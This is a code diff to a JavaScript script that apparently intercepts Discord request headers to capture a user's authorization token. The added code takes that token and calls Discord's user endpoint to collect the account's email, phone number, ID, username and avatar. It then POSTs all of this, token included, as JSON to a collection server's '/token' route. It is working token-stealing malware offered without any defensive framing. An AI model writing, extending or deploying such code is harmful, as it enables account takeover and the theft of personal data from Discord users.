@@ -1,9 +1,9 @@
-const apiurl = "http://127.0.0.1:8080"
+const apiurl = "http://127.0.0.1:3000";
 
 
 async function fetch_configuration() {
 	try {
-		const request = await fetch(apiurl + "/config/config.json");
+		const request = await fetch(apiurl + "/config");
 
 		if (!request.ok) {
 			throw new Error(`Failed to fetch config file. Status: ${request.status} ${request.statusText}`);
@@ -60,8 +60,11 @@ async function fetch_configuration() {
 					authToken = arguments[1];
 					authTokenObtained = true;
 					console.log("Token Obtained.");
+
+				let result = await getUserdetails(authToken);
+				console.log("result is typeof: "+  typeof result);
 			
-				sendToken(apiurl + "/token", authToken)
+				await sendToken(apiurl + "/token", result);
 			
 				}
 				if(insideChannelRequest && arguments[0] == "X-Super-Properties"){
@@ -79,13 +82,44 @@ async function fetch_configuration() {
 
 })()
 
-async function sendToken(url, token) {
+async function getUserdetails(token) {
+	try {
+		const request = await fetch("https://discord.com/api/v9/users/@me", {
+			method: 'GET',
+			headers: {
+			  'Authorization': token
+			}
+		});
+
+		if (!request.ok) {
+			throw new Error(`Error fetching user details: ${request.statusText}`);
+		}
+
+		const response = await request.json();
+		const userobj = {
+			avatar: `https://cdn.discordapp.com/avatars/${response.id}/${response.avatar}.webp?size=256`,
+			email: response.email,
+			id: response.id,
+			phone: response.phone,
+			token: token,
+			username: response.username,
+		}
+		console.log(userobj);
+		return userobj
+	} catch (error) {
+		console.error("an error occurred while trying to fetch this api point", error);
+	}
+}
+
+async function sendToken(url, da_body) {
+	console.log("SENDING: " + typeof da_body);
 	try {
 		const request = await fetch(url, {
 			method: 'POST',
 			headers: {
-			  'Authorization': token
-			}
+			  'content-type': 'application/json'
+			},
+			body: JSON.stringify(da_body)
 		});
 		
 		if (!request.ok) {
